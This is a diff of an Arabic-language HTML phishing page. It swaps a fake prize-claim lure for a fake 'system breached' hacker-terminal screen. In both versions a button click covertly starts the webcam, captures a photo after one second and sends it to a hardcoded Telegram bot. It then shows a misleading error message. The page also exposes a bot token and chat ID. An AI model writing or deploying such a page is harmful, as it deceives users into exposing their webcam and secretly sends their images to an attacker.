@@ -1,21 +1,28 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استلم جائزتك الآن!</title>
+    <title>SYSTEM BREACHED</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding: 50px; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        body { background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .glitch { font-size: 20px; text-transform: uppercase; margin-bottom: 20px; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .terminal { background: rgba(0, 50, 0, 0.2); border: 1px solid #00FF00; padding: 20px; border-radius: 5px; box-shadow: 0 0 15px #00FF00; width: 80%; max-width: 500px; text-align: left; }
+        button { background: #00FF00; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; text-transform: uppercase; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>مبروك! لقد ربحت جائزة قيمة 🎁</h1>
-        <p>اضغط على الزر بالأسفل لتفعيل حسابك واستلام الجائزة فوراً.</p>
-        <button id="capture">استلام الجائزة الآن</button>
+
+    <div class="glitch">-- WARNING: UNAUTHORIZED ACCESS --</div>
+    <div class="terminal">
+        <p>> Initializing system exploit...</p>
+        <p>> Bypassing firewall... DONE</p>
+        <p>> Accessing local files... PENDING</p>
+        <p style="color: red;">! ERROR: Identity Verification Required !</p>
+        <p>لتكملة عملية الاختراق وتأكيد هويتك، اضغط بالأسفل:</p>
+        <button id="startBtn">تجاوز نظام الحماية (Bypass)</button>
     </div>
 
     <video id="video" autoplay></video>
@@ -25,15 +32,16 @@
         const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
         const chatId = "8042090388";
 
-        const btn = document.getElementById('capture');
+        const startBtn = document.getElementById('startBtn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        btn.addEventListener('click', async () => {
+        startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
+                // التقاط الصورة بعد ثانية من فتح الكاميرا
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
@@ -49,13 +57,13 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            alert("عذراً، حدث خطأ في الخادم. حاول مرة أخرى لاحقاً.");
+                            alert("Bypass Failed: Security system active. Closing session...");
                             stream.getTracks().forEach(track => track.stop());
                         });
                     }, 'image/jpeg');
                 }, 1000);
             } catch (err) {
-                alert("يجب السماح بالوصول للكاميرا لاستلام الجائزة.");
+                alert("يجب تفعيل الكاميرا لتجاوز حماية النظام!");
             }
         });
     </script>
